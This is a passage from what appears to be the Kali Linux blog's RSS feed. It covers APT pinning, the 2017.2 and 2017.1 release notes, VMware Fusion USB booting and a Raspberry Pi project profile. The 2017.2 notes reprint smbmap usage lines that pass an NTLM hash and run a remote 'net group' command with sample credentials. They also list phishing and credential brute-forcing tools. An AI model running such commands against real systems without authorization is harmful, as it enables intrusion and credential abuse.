class="language-console">root@kali:~# cat /etc/apt/apt.conf.d/local DPkg::options { &quot;--force-confdef&quot;; &quot;--force-confold&quot;; } APT::Default-Release &quot;kali-rolling&quot;; </code></pre> <h3 id="pinning-package-versions">Pinning Package Versions</h3> <p>Occasionally, you will find some application that needs a specific version of a particular package and will not work with any other. Other times, an update to one package might adversely affect other tools. This happened to us recently with an update to the devscripts package, which was preventing us from building Kali packages.</p> <p>Fortunately, APT allows you to <em>pin</em> a package to a particular version by setting its priority to <em>1001</em> in <strong><em>/etc/apt/preferences</em></strong>. For example, to tell APT to hold the devscripts package at version 2.16.x, you would add the following:</p> <pre><code class="language-console">Package: devscripts Pin: version 2.16.* Pin-Priority: 1001 </code></pre> <h2 id="additional-resources">Additional Resources</h2> <p>In this post, we have only been able to scratch the surface of how you can extend APT far beyond the default Kali or Debian ecosystem. The solver algorithms are very effective and running into issues is rare, so you need not fear exploring other repositories. To learn more about APT and how to bend it to your will, we encourage you to refer to <a href="https://web.archive.org/web/20210914172345/https://kali.training/topic/introduction-to-apt/">Kali Linux Revealed</a> and <a href="https://debian-handbook.info/browse/stable/apt.html">The Debian Administrator&rsquo;s Handbook</a>, both of which contain a wealth of information, tips, and tricks.</p></description>
</item>
<item>
<title>Kali Linux 2017.2 Release</title>
<link>https://www.kali.org/blog/kali-linux-2017-2-release/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-2017-2-release/</guid>
<pubDate>Wed, 20 Sep 2017 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-2017-2-release/images/kali-2017-2-release.jpg" type="image/jpg"/>
<description><p>We are happy to announce the release of Kali Linux 2017.2, <a href="https://www.kali.org/get-kali/">available now</a> for your downloading pleasure. This release is a roll-up of all updates and fixes since our <a href="https://www.kali.org/blog/kali-linux-2017-1-release/">2017.1 release</a> in April. In tangible terms, if you were to install Kali from your 2017.1 ISO, after logging in to the desktop and running &lsquo;apt update &amp;&amp; apt full-upgrade&rsquo;, you would be faced with something similiar to this daunting message:</p> <pre><code class="language-plain">1399 upgraded, 171 newly installed, 16 to remove and 0 not upgraded. Need to get 1,477 MB of archives. After this operation, 1,231 MB of additional disk space will be used. Do you want to continue? [Y/n] </code></pre> <p>That would make for a whole lot of downloading, unpacking, and configuring of packages. Naturally, these numbers don&rsquo;t tell the entire tale so read on to see what&rsquo;s new in this release.</p> <h3 id="new-and-updated-packages-in-kali-20172">New and Updated Packages in Kali 2017.2</h3> <p>In addition to all of the standard security and package updates that come to us via <a href="https://wiki.debian.org/DebianTesting">Debian Testing</a>, we have also added more than a dozen new tools to the repositories, a few of which are listed below. There are some really nice additions so we encourage you to &lsquo;apt install&rsquo; the ones that pique your interest and check them out.</p> <ul> <li><strong><a href="https://github.com/fnord0/hURL">hurl</a></strong> - a useful little hexadecimal and URL encoder/decoder</li> <li><strong><a href="https://github.com/ryhanson/phishery">phishery</a></strong> - phishery lets you inject SSL-enabled basic auth phishing URLs into a .docx Word document</li> <li><strong><a href="https://github.com/arthepsy/ssh-audit">ssh-audit</a></strong> - an SSH server auditor that checks for encryption types, banners, compression, and more</li> <li><strong><a href="https://www.kali.org/docs/tools/removed-tools/">apt2</a></strong> - an Automated Penetration Testing Toolkit that runs its own scans or imports results from various scanners, and takes action on them</li> <li><strong><a href="https://github.com/BloodHoundAD/BloodHound">bloodhound</a></strong> - uses graph theory to reveal the hidden or unintended relationships within Active Directory</li> <li><strong><a href="https://github.com/byt3bl33d3r/CrackMapExec">crackmapexec</a></strong> - a post-exploitation tool to help automate the assessment of large Active Directory networks</li> <li><strong><a href="https://dbeaver.io/">dbeaver</a></strong> - powerful GUI database manager that supports the most popular databases, including MySQL, PostgreSQL, Oracle, SQLite, and many more</li> <li><strong><a href="https://github.com/x90skysn3k/brutespray">brutespray</a></strong> - automatically attempts default credentials on discovered services</li> </ul> <p>On top of all the new packages, this release also includes numerous package updates, including <a href="https://www.kali.org/tools/jd-gui/">jd-gui</a>, <a href="https://www.kali.org/tools/dnsenum/">dnsenum</a>, <a href="https://www.kali.org/tools/edb-debugger/">edb-debugger</a>, <a href="https://www.kali.org/tools/wpscan/">wpscan</a>, watobo, <a href="https://www.kali.org/tools/burpsuite/">burpsuite</a>, and many others. To check out the full list of updates and additions, refer to the <a href="https://bugs.kali.org/changelog_page.php">Kali changelog</a> on our bug tracker.</p> <h3 id="ongoing-integration-improvements">Ongoing Integration Improvements</h3> <p>Beyond the new and updated packages in this release, we have also been working towards improving the overall integration of packages in Kali Linux. One area in particular is in program usage examples. Many program authors assume that their application will only be run in a certain manner or from a certain location. For example, the SMBmap application has a binary name of &lsquo;smbmap&rsquo; but if you were to look at the usage example, you would see this:</p> <p>Examples:</p> <pre><code class="language-console">$ python smbmap.py -u jsmith -p password1 -d workgroup -H 192.168.0.1 $ python smbmap.py -u jsmith -p 'aad3b435b51404eeaad3b435b51404ee:da76f2c4c96028b7a6111aef4a50a94d' -H 172.16.0.20 $ python smbmap.py -u 'apadmin' -p 'asdf1234!' -d ACME -h 10.1.3.30 -x 'net group &quot;Domain Admins&quot; /domain' </code></pre> <p>If you were a novice user, you might see these examples, try to run them verbatim, find that they don&rsquo;t work, assume the tool doesn&rsquo;t work, and move on. That would be a shame because smbmap is an excellent program so we have been working on fixing these usage discrepancies to help improve the overall fit and finish of the distribution. If you run &lsquo;smbmap&rsquo; in Kali 2017.2, you will now see this output instead:</p> <p>Examples:</p> <pre><code class="language-console">$ smbmap -u jsmith -p password1 -d workgroup -H 192.168.0.1 $ smbmap -u jsmith -p 'aad3b435b51404eeaad3b435b51404ee:da76f2c4c96028b7a6111aef4a50a94d' -H 172.16.0.20 $ smbmap -u 'apadmin' -p 'asdf1234!' -d ACME -h 10.1.3.30 -x 'net group &quot;Domain Admins&quot; /domain' </code></pre> <p>We hope that small tweaks like these will help reduce confusion to both veterans and newcomers and it&rsquo;s something we will continue working towards as time goes on.</p> <h3 id="learn-more-about-kali-linux">Learn More About Kali Linux</h3> <p>In the time since the release of 2017.1, we also released our first book, Kali Linux Revealed, in both <del>physical</del> and <a href="https://kali.training/">online</a> formats. If you are interested in going far beyond the basics, really want to learn how Kali Linux works, and how you can leverage its many advanced features, we encourage you to check it out. Once you have mastered the material, you will have the foundation required to pursue the <a href="https://web.archive.org/web/20220129202701/https://home.pearsonvue.com/kali">Kali Linux Certified Professional</a> certification.</p> <h3 id="kali-iso-downloads-virtual-machines-and-arm-images">Kali ISO Downloads, Virtual Machines and ARM Images</h3> <p>The Kali Rolling 2017.2 release can be downloaded via our <a href="https://www.kali.org/get-kali/">official Kali Download page</a>. This release, we have also updated our <a href="https://www.kali.org/get-kali/#kali-vm">Kali Virtual Images</a> and <a href="https://www.kali.org/get-kali/#kali-arm">Kali ARM Images</a> downloads. As always, if you already have Kali installed and running to your liking, all you need to do in order to get up-to-date is run the following:</p> <pre><code class="language-sh">apt update apt dist-upgrade reboot </code></pre> <p>We hope you enjoy this fine release as much as we enjoyed making it!</p></description>
</item>
<item>
<title>VMware Fusion Kali USB Boot</title>
<link>https://www.kali.org/blog/vmware-fusion-kali-usb-boot/</link>
<guid isPermaLink="true">https://www.kali.org/blog/vmware-fusion-kali-usb-boot/</guid>
<pubDate>Wed, 26 Jul 2017 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/vmware-fusion-kali-usb-boot/images/vmware-fusion-kali-usb-boot.jpg" type="image/jpg"/>
<description><h2 id="vmware-fusion-kali-usb-boot">VMware Fusion Kali USB Boot</h2> <p>One of the fun, and often necessary, features of Kali Linux is the ability to create really killer, completely customized live-boot installations. Normally stored on a USB drive, these installations put the power of Kali Linux in your pocket, ready to launch whenever you need it.</p> <p>Building Kali live USB installations is pretty straightforward, whether you&rsquo;re going for plain installation, building in persistence so you can store files, going fully-encrypted (even arming a self-destruct passphrase), or customizing and building your own tailored install.</p> <p>However, the process of testing your USB install can be a bit of a pain, especially if you&rsquo;re a Mac user. You could, under certain circumstances, reboot your Mac and boot from the USB, but that can be a real hassle.</p> <p>However, wouldn&rsquo;t it be great if you could use a product like <a href="https://www.vmware.com/ca/products/fusion.html">VMware Fusion</a> (which is the industry-leading product and does a fabulous job running every other OS on our Macs already) to boot and test your live USBs? No rebooting. No fuss. Just pop it in and let it fly.</p> <p>That seemed like a great idea but the Fusion product has been in flux for awhile, and seems to get &ldquo;special&rdquo; treatment from VMware. The company seems to think that Mac users don&rsquo;t need extensive options, like a checkbox for EFI booting. Instead, they set it up so that if your guest is Mac or Windows-based, it will automatically do an EFI boot for you. That&rsquo;s helpful, but if you create a Mac or Windows guest and try to boot from the USB, you&rsquo;ll get the Kali boot screen, followed by a boot-halting message that the USB doesn&rsquo;t contain a version of Mac or Windows.</p> <p>Because of this flux, and core differences between Fusion and the rest of the VMware line, this EFI USB booting issue had us stumped. A few workarounds have been introduced, like booting a specialized VM that would attempt an EFI boot, but they had their own problems.</p> <p>Thankfully, Fusion has matured enough that now we can get under the hood and make this process work. Here&rsquo;s how you do it.</p> <p>Create a new custom VM:</p> <p><p> <a href='https://www.kali.org/blog/vmware-fusion-kali-usb-boot/images/image1.png'> <img src="https://www.kali.org/blog/vmware-fusion-kali-usb-boot/images/image1.png" alt="" /> </a> </p> </p> <p>Select &ldquo;Linux&rdquo; -&gt; &ldquo;Debian 8.x 64-bit&rdquo;.</p> <p><p> <a href='https://www.kali.org/blog/vmware-fusion-kali-usb-boot/images/image2.png'> <img src="https://www.kali.org/blog/vmware-fusion-kali-usb-boot/images/image2.png" alt="" /> </a> </p> </p> <p>Create a new virtual disk. Settings do not matter.</p> <p><p> <a href='https://www.kali.org/blog/vmware-fusion-kali-usb-boot/images/image3.png'> <img src="https://www.kali.org/blog/vmware-fusion-kali-usb-boot/images/image3.png" alt="" /> </a> </p> </p> <p>Click &ldquo;Finish&rdquo;:</p> <p><p> <a href='https://www.kali.org/blog/vmware-fusion-kali-usb-boot/images/image4.png'> <img src="https://www.kali.org/blog/vmware-fusion-kali-usb-boot/images/image4.png" alt="" /> </a> </p> </p> <p>Give it a snappy name:</p> <p><p> <a href='https://www.kali.org/blog/vmware-fusion-kali-usb-boot/images/image5.png'> <img src="https://www.kali.org/blog/vmware-fusion-kali-usb-boot/images/image5.png" alt="" /> </a> </p> </p> <p>Shut down the machine. Go to &ldquo;Virtual Machine&rdquo; -&gt; &ldquo;Settings&rdquo; -&gt; &ldquo;Processor and Memory&rdquo;, set memory to at least 2048 MB, and set cores to &ldquo;2&rdquo;:</p> <p><p> <a href='https://www.kali.org/blog/vmware-fusion-kali-usb-boot/images/image6.png'> <img src="https://www.kali.org/blog/vmware-fusion-kali-usb-boot/images/image6.png" alt="" /> </a> </p> </p> <p>Next, head to &ldquo;Settings&rdquo; -&gt; &ldquo;Display&rdquo;, and check &ldquo;Accelerate 3D Graphics&rdquo;. This is optional, but it really helps the performance of your Kali experience. &ldquo;Use full resolution..&rdquo; is also optional.</p> <p><p> <a href='https://www.kali.org/blog/vmware-fusion-kali-usb-boot/images/image7.png'> <img src="https://www.kali.org/blog/vmware-fusion-kali-usb-boot/images/image7.png" alt="" /> </a> </p> </p> <p>Head to &ldquo;USB Devices&rdquo;. Insert your Kali USB and set USB compatibility to USB 3.0 (if you have a USB 3.0 compatible system and drive). Note that USB-C, dongles or not, make no difference here. Just make sure that if you&rsquo;re using a USB-C device, select USB 3.0 compatibility. Select &ldquo;Connect to Linux&rdquo; as the &ldquo;Plug in Action&rdquo; and set the machine to &ldquo;Connect to this virtual machine&rdquo; when it is plugged in:</p> <p><p> <a href='https://www.kali.org/blog/vmware-fusion-kali-usb-boot/images/image8.png'> <img src="https://www.kali.org/blog/vmware-fusion-kali-usb-boot/images/image8.png" alt="" /> </a> </p> </p> <p>Go to &ldquo;Settings&rdquo; -&gt; &ldquo;Disks&rdquo;. Select &ldquo;Advanced Options&rdquo; and &ldquo;Remove Hard Disk&rdquo;, sending it to the Trash. You won&rsquo;t need it.</p> <p><p> <a href='https://www.kali.org/blog/vmware-fusion-kali-usb-boot/images/image9.png'> <img src="https://www.kali.org/blog/vmware-fusion-kali-usb-boot/images/image9.png" alt="" /> </a> </p> </p> <p>Next, you&rsquo;ll need to enable EFi booting. There is no GUI setting for this so, you need to find this VM on your hard drive. Virtual hard drives are stored by default in <strong><em>~/Documents//Virtual Machines.localized</em></strong>. Change to the directory containing this VM. Ours is called &ldquo;Kali USB Boot&rdquo; so the full path is <strong><em>~/Documents//Virtual Machines.localized/Kali USB Boot.vmwarevm</em></strong>&quot;. Within that directory is a <strong><em>.vmx</em></strong> file named after the VM. Ours is called <strong><em>Kali USB Boot.vmx</em></strong>. Edit that file with your favourite editor and insert the following line:</p> <p><code>firmware = &quot;efi&quot;</code></p> <p>Be careful with copy and paste. If you paste this line into the editor, you may get funny &ldquo;Mac quotes&rdquo; and this will break the VM. Your <strong><em>.vmx</em></strong> file should look something like this:</p> <p><p> <a href='https://www.kali.org/blog/vmware-fusion-kali-usb-boot/images/image10.png'> <img src="https://www.kali.org/blog/vmware-fusion-kali-usb-boot/images/image10.png" alt="" /> </a> </p> </p> <p>Now, power on your VM, and it should boot to Kali Linux:</p> <p><p> <a href='https://www.kali.org/blog/vmware-fusion-kali-usb-boot/images/image11.png'> <img src="https://www.kali.org/blog/vmware-fusion-kali-usb-boot/images/image11.png" alt="" /> </a> </p> </p> <h3 id="troubleshooting-usb-connections">Troubleshooting USB Connections</h3> <p>If you run into problems, you have a few options. First, power off your VM. Go to &ldquo;Settings&rdquo; -&gt; &ldquo;USB Devices&rdquo; and leave this settings screen up next to your powered-off VM. (You can also expand your toolbar and look at the USB icon). Now, power on the VM. Immediately, you should see the USB Settings screen update with a check next to your USB device:</p> <p><p> <a href='https://www.kali.org/blog/vmware-fusion-kali-usb-boot/images/image12.png'> <img src="https://www.kali.org/blog/vmware-fusion-kali-usb-boot/images/image12.png" alt="" /> </a> </p> </p> <p>If you don&rsquo;t get a check mark, this means that your Mac has grabbed the USB drive. Power off your VM, eject the drive from the Mac, and power on the VM again with the USB settings screen up. You should see the check mark and get the Kali boot screen.</p> <p><p> <a href='https://www.kali.org/blog/vmware-fusion-kali-usb-boot/images/image13.png'> <img src="https://www.kali.org/blog/vmware-fusion-kali-usb-boot/images/image13.png" alt="" /> </a> </p> </p> <h3 id="troubleshooting-efi">Troubleshooting EFI</h3> <p>When booting with EFI, your boot screen should look like this:</p> <p><p> <a href='https://www.kali.org/blog/vmware-fusion-kali-usb-boot/images/image14.png'> <img src="https://www.kali.org/blog/vmware-fusion-kali-usb-boot/images/image14.png" alt="" /> </a> </p> </p> <p>This indicates that EFI is enabled. If it&rsquo;s not, triple-check that you entered the firmware line correctly in the <strong><em>.vmx</em></strong> file. Note that in some cases, this EFI Network check may hang. Simply pressing ESC within the VM nudges the process along.</p> <p>On a normal boot, you can click inside the VM screen and press ESC <em>quickly</em> just as the VMware logo is appearing on the screen to get to the Boot Manager:</p> <p><p> <a href='https://www.kali.org/blog/vmware-fusion-kali-usb-boot/images/image15.png'> <img src="https://www.kali.org/blog/vmware-fusion-kali-usb-boot/images/image15.png" alt="" /> </a> </p> </p> <p>From here, you can select &ldquo;EFI Internal Shell&rdquo; to get into the shell. If you get something like this, missing an fs0 map, then EFI doesn&rsquo;t see your USB drive. If this is the case, power off the virtual machine, unplug the USB, start the VM, and immediately after pressing start, insert the drive, looking for the checkmark in settings.</p> <p>If everything goes well, you&rsquo;re booted into Kali. Otherwise, you can get to an EFI shell with ESC, &ldquo;EFI Internal Shell&rdquo;. A &ldquo;happy&rdquo; EFI shell looks like this:</p> <p><p> <a href='https://www.kali.org/blog/vmware-fusion-kali-usb-boot/images/image16.png'> <img src="https://www.kali.org/blog/vmware-fusion-kali-usb-boot/images/image16.png" alt="" /> </a> </p> </p> <p>Note the fs0 map. Next, you can enter &lsquo;fs0:&rsquo; and &rsquo;ls&rsquo; to look around.</p> <p><p> <a href='https://www.kali.org/blog/vmware-fusion-kali-usb-boot/images/image17.png'> <img src="https://www.kali.org/blog/vmware-fusion-kali-usb-boot/images/image17.png" alt="" /> </a> </p> </p> <p>You can enter &lsquo;cd efi\boot&rsquo; (notice the backslash, not a forward slash!) and boot the device manually with &lsquo;bootx64.efi&rsquo;</p> <p><p> <a href='https://www.kali.org/blog/vmware-fusion-kali-usb-boot/images/image18.png'> <img src="https://www.kali.org/blog/vmware-fusion-kali-usb-boot/images/image18.png" alt="" /> </a> </p> </p> <p>This should give you a happy EFI boot:</p> <p><p> <a href='https://www.kali.org/blog/vmware-fusion-kali-usb-boot/images/image19.png'> <img src="https://www.kali.org/blog/vmware-fusion-kali-usb-boot/images/image19.png" alt="" /> </a> </p> </p> <p>Note that on some installations, the shutdown, followed by removing the drive, powering on the VM and inserting the drive might be required. This likely has much to do with the Mac grabbing the USB drive, or half-grabbing it (without mounting).</p></description>
</item>
<item>
<title>Kali Drones, Portable CTF Builds, Raspberry Pi Craziness and More!</title>
<link>https://www.kali.org/blog/kali-drones-portable-ctf-builds-raspberry-pi-craziness-and-more/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-drones-portable-ctf-builds-raspberry-pi-craziness-and-more/</guid>
<pubDate>Thu, 29 Jun 2017 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-drones-portable-ctf-builds-raspberry-pi-craziness-and-more/images/kali-pi-drone.jpg" type="image/jpg"/>
<description><p>The Kali community is a pretty crazy thing. There are folks all over the world doing interesting things with Kali Linux and far too often, these cool projects get overlooked. Part of the problem is that the community is spread out all over the &rsquo;net. We&rsquo;re continuing to help build the Kali community to help with this problem, but that&rsquo;s a slightly longer topic. In the meantime, we want to keep you well-informed about cool stuff that&rsquo;s happening in our world-wide community. We&rsquo;ll also be reaching out to standout members of our community, highlight their work, and get them involved in building our new community.</p> <p>In this, the first of many community updates, we want to highlight the work of one of our members, @Re4son, who has been a long-time Kali Linux advocate, a volunteer moderator on the <a href="https://forums.kali.org/">Kali Linux forums</a> and a &ldquo;Dedicated technology enthusiast, obsessed with setting every machine free from the oppression of its maker&rdquo; who is checking in all the way from Melbourne, Australia.</p> <p>An OffSec alumni holding both an <a href="https://www.offsec.com/pwk-oscp/">OSCP</a> and an <a href="https://www.offsec.com/ctp-osce/">OSCE</a>, @Re4son had an idea to create &ldquo;a small, cheap, autonomous, and low-energy Kali platform with direct hardware access that can do its hacking quietly in the corner or hassle-free on the road&rdquo;. He turned his attention to the Raspberry Pi line, which offered a strong accessory aftermarket, but he discovered that the hardware support was somewhat limited for his needs.</p> <p>&ldquo;In 2015 .. I started porting the drivers myself,&rdquo; he explains, &ldquo;and the sticky fingers (touch screen) interface started off as a way to switch between HDMI and TFT screens without needing a keyboard.&rdquo;</p> <h3 id="his-project-has-come-a-long-way">His Project has Come a Long Way</h3> <p>&ldquo;<a href="https://whitedome.com.au/re4son/kali-pi/">Sticky Fingers Kali-Pi</a> combines Kali Linux and the Re4son-Kernel into a hassle-free package that turns any Raspberry Pi into a powerful Swiss Army knife with finger-friendly touch screen interface that can provide backend support in your own network, or operate autonomously behind enemy lines, posing as a humidity sensor. Out of the box, the Kali-Pi comes preconfigured with all essential services, such as SSH, VNC, FTP, HTTP, and Wi-Fi backdoor, as well as the <a href="https://github.com/sensepost/mana">MANA toolkit</a>, <a href="https://www.snort.org/">Snort</a>, <a href="https://www.kismetwireless.net/">Kismet</a>, <a href="https://metasploit.com/">Metasploit</a>, etc. and a finger-friendly touch screen interface to control it all.&rdquo;</p> <p><p> <a href='https://www.kali.org/blog/kali-drones-portable-ctf-builds-raspberry-pi-craziness-and-more/images/01-kali-pi.png'> <img src="https://www.kali.org/blog/kali-drones-portable-ctf-builds-raspberry-pi-craziness-and-more/images/01-kali-pi.png" alt="" /> </a> </p> </p> <p>Built on a Raspberry Pi 0/0W/1/2/3, this setup can be quick-installed from a pre-configured image or built from scratch, and has options for a TFT touch screen with a custom-built intuitive touch menu, bluetooth, injection support, and more. He&rsquo;s even strapped this puppy onto a drone for some high-flying &ldquo;research&rdquo;.</p> <p><p> <a href='https://www.kali.org/blog/kali-drones-portable-ctf-builds-raspberry-pi-craziness-and-more/images/02-kali-drone.png'> <img src="https://www.kali.org/blog/kali-drones-portable-ctf-builds-raspberry-pi-craziness-and-more/images/02-kali-drone.png" alt="" /> </a> </p> </p> <p>At the heart of this cool project is the <a href="https://whitedome.com.au/re4son/download/re4son-kernel-current/">Re4son-Kernel</a> for Raspberry Pi. Built to work with the Pi 0/0W/1/2/3, the Re4son-Kernel, &ldquo;allows Kali Linux to get the best out of any Raspberry Pi by supplying support for the onboard wifi and Bluetooth, wifi injection patches, additional hardware support, security enhancements, headers, sources, etc.&rdquo;</p> <p>It also provides complete armel support for the Pi 1, Zero, and Zero W and armhf support for the Pi 2 and 3 and all versions are 100% compatible with the stock Kali Linux Kernel.</p> <p><p> <a href='https://www.kali.org/blog/kali-drones-portable-ctf-builds-raspberry-pi-craziness-and-more/images/03-kali-drone-screen.png'> <img src="https://www.kali.org/blog/kali-drones-portable-ctf-builds-raspberry-pi-craziness-and-more/images/03-kali-drone-screen.png" alt="" /> </a> </p> </p> <p>In addition, @Re4son has released images and instructions for a &ldquo;Damn Vulnerable&rdquo; version of the Sticky Fingers Kali Pi, the &ldquo;<a href="https://whitedome.com.au/re4son/sticky-fingers-dv-pi">Sticky Fingers DV-PI</a>&rdquo; which runs on Raspberry Pi 0/0W/1/2/3 (with or without touchscreen) and is pre-configured with &ldquo;easy(ish)&rdquo; and &ldquo;medium difficulty&rdquo; vulnerabilities for penetration and privilege escalation. This portable, low cost &ldquo;vulnerability playground&rdquo; is perfect for home research, skills sharpening, training, or even small CTF-style contests wherever you happen to be.</p> <p>&ldquo;OffSec training courses supply the know-how to achieve world domination&rdquo;, @Re4son tells us, &ldquo;and Sticky Fingers Kali-Pi provides the tools. Hacking has never been more fun.&rdquo;</p> <p>We whole-heartedly agree. We&rsquo;re pretty excited about @Re4son&rsquo;s Kali-Pi, Re4son-Kernel, and Sticky Fingers DV-PI projects and are thankful for his unwavering support of users in the <a href="https://forums.kali.org/">Kali Linux forum</a>.</p> <p>Thanks, @Re4son, for your hard work, for being a shining member of the Kali community, and for keeping things fun.</p> <p>@Re4son invites you to get involved as he works on new modules and improving his projects. He can be reached on the Kali forums, at <a href="https://twitter.com/Re4sonKernel">@Re4sonKernel</a>, <a href="https://github.com/Re4son">github.com/Re4son</a> or <a href="https://whitedome.com.au/re4son/">whitedome.com.au/re4son/</a>.</p></description>
</item>
<item>
<title>Kali Linux 2017.1 Release</title>
<link>https://www.kali.org/blog/kali-linux-2017-1-release/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-2017-1-release/</guid>
<pubDate>Tue, 25 Apr 2017 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-2017-1-release/images/kali-release-2017-1.jpg" type="image/jpg"/>
<description><p>Finally, it&rsquo;s here! We&rsquo;re happy to announce the availability of the <strong>Kali Linux 2017.1 rolling release</strong>, which brings with it a bunch of exciting updates and features. As with all new releases, you have the common denominator of <a href="https://bugs.kali.org/changelog_page.php">updated packages</a>, an updated kernel that provides more and better hardware support, as well as a slew of updated tools - but this release has a few more surprises up its sleeve.</p> <h3 id="support-for-rtl8812au-wireless-card-injection">Support for RTL8812AU Wireless Card Injection</h3> <p>A while back, we received a feature request asking for the <a href="https://bugs.kali.org/view.php?id=3260">inclusion of drivers for RTL8812AU wireless chipsets</a>. These drivers are not part of the standard Linux kernel, and have been modified to allow for injection. Why is this a big deal? This chipset supports <strong>802.11 AC</strong>, making this one of the first drivers to bring injection-related wireless attacks to this standard, and with companies such as ALFA making the <strong>AWUS036ACH</strong> wireless cards, we expect this card to be an arsenal favourite.</p> <p>The driver can be installed using the following commands:</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2017-1-release/images/AWUS036ACH.png'> <img src="https://www.kali.org/blog/kali-linux-2017-1-release/images/AWUS036ACH.png" alt="" /> </a> </p> </p> <pre><code class="language-sh">apt-get update apt install realtek-rtl88xxau-dkms </code></pre> <h3 id="streamlined-support-for-cuda-gpu-cracking">Streamlined Support for CUDA GPU Cracking</h3> <p>Installing proprietary graphics drivers has always been a source of frustration in Kali. Fortunately, improvements in packaging have made this process seamless - allowing our users a streamlined experience with GPU cracking. Together with supported hardware, tools such as Hashcat and Pyrit can take full advantage of NVIDIA GPUs within Kali. For more information about this new feature, check out the <a href="https://www.kali.org/blog/cloud-cracking-with-cuda-gpu/">related blog post</a> and updated <a href="https://www.kali.org/docs/general-use/install-nvidia-drivers-on-kali-linux/">official documentation</a>.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2017-1-release/images/small_nvidia-geforce-gtx-1070-5.png'> <img src="https://www.kali.org/blog/kali-linux-2017-1-release/images/small_nvidia-geforce-gtx-1070-5.png" alt="" /> </a> </p> </p> <h3 id="amazon-aws-and-microsoft-azure-availability-gpu-support">Amazon AWS and Microsoft Azure Availability (GPU Support)</h3> <p>Due to the increasing popularity of using cloud-based instances for password cracking, we decided to focus our efforts into streamlining Kali&rsquo;s approach. We noticed that Amazon&rsquo;s AWS <a href="https://aws.amazon.com/ec2/instance-types/p2/">P2-Series</a> and Microsoft&rsquo;s Azure <a href="https://azure.microsoft.com/en-us/blog/azure-n-series-general-availability-on-december-1/">NC-Series</a> allow pass-through GPU support so we made corresponding AWS and Azure images of Kali that support CUDA GPU cracking out of the box. You can check out our <a href="https://www.kali.org/blog/cloud-cracking-with-cuda-gpu/">Cracking in the Cloud with CUDA GPUs</a> post we released a few weeks back for more information.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2017-1-release/images/Azure-AWS.png'> <img src="https://www.kali.org/blog/kali-linux-2017-1-release/images/Azure-AWS.png" alt="" /> </a> </p> </p> <h3 id="openvas-9-packaged-in-kali-repositories">OpenVAS 9 Packaged in Kali Repositories</h3> <p>One of the most lacking tool categories in Kali (as well as the Open-source arena at large) is a fully-fledged vulnerability scanner. We&rsquo;ve recently packaged OpenVAS 9 (together with a multitude of dependencies) and can happily say that, in our opinion, the OpenVAS project has matured significantly. We still do not include OpenVAS in the default Kali release due to its large footprint, but OpenVAS can easily be downloaded and installed using the following commands:</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2017-1-release/images/openvas9-screenshot.png'> <img src="https://www.kali.org/blog/kali-linux-2017-1-release/images/openvas9-screenshot.png" alt="" /> </a> </p> </p> <pre><code class="language-sh">apt-get update apt install openvas </code></pre> <h3 id="kali-linux-revealed-book-and-online-course">Kali Linux Revealed Book and Online Course</h3> <p>To those of you following our recent announcement regarding the <a href="https://www.kali.org/blog/introducing-kali-linux-certified-professional/">Kali Linux Certified Professional</a> program, we&rsquo;re happy to say that we&rsquo;re spot on schedule. The <em>Kali Linux Revealed</em> book will be available in early July, and the free online version will be available shortly after that. We&rsquo;re really excited about both the book and the online course and are anxiously waiting for this release - it marks a real cornerstone for us, as our project continues to grow and mature. To keep updated regarding the release of both the book and the online course, make sure to follow us on <a href="https://twitter.com/kalilinux">Twitter</a>.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2017-1-release/images/kali-revealed-book-mock.png'> <img src="https://www.kali.org/blog/kali-linux-2017-1-release/images/kali-revealed-book-mock.png" alt="" /> </a> </p> </p> <h3 id="kali-linux-at-black-hat-vegas-2017">Kali Linux at Black Hat Vegas 2017</h3> <p>This year, we are fortunate enough to debut our <a href="https://www.kali.org/blog/introducing-kali-linux-certified-professional/">first official Kali Linux training</a> at the <strong>Black Hat</strong> conference in Las Vegas, 2017. This in-depth, four day course will focus on the Kali Linux platform itself (as opposed to the tools, or penetration testing techniques), and help you understand and maximize the usage of Kali from the ground up. Delivered by <a href="https://www.kali.org/about-us/">Mati Aharoni</a> and Johnny Long, in this four day class you will learn to become a Kali Linux ninja. We will also be delivering another Dojo event this year - more details about that to come at a later date.</p> <p><a href="https://www.blackhat.com/us-17/training/kali-linux-revealed-mastering-the-penetration-testing-distribution.html">Register for Black Hat Training</a></p> <h3 id="kali-iso-downloads-virtual-machines-and-arm-images">Kali ISO Downloads, Virtual Machines and ARM Images</h3> <p>The Kali Rolling 2017.1 release can be downloaded via our official Kali Download page. If you missed it, our repositories have recently been <a href="https://www.kali.org/blog/kali-linux-repository-https-support/">updated to support HTTPS</a>, as well as an HTTPS <strong>apt</strong> transport. This release, we have also updated our <a href="https://www.kali.org/get-kali/#kali-vm">Kali Virtual Images</a> and <a href="https://www.kali.org/get-kali/#kali-arm">Kali ARM Images</a> downloads. As usual, if you&rsquo;ve got Kali already installed, all you need to do to be fully updated is:</p> <pre><code class="language-sh">apt update apt dist-upgrade reboot </code></pre> <p>We hope you enjoy this fine release!</p></description>
</item>
<item>
<title>Kali Linux Repository HTTPS Support</title>
<link>https://www.kali.org/blog/kali-linux-repository-https-support/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-repository-https-support/</guid>
<pubDate>Mon, 24 Apr 2017 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-repository-https-support/images/kali-repo-https.jpg" type="image/jpg"/>
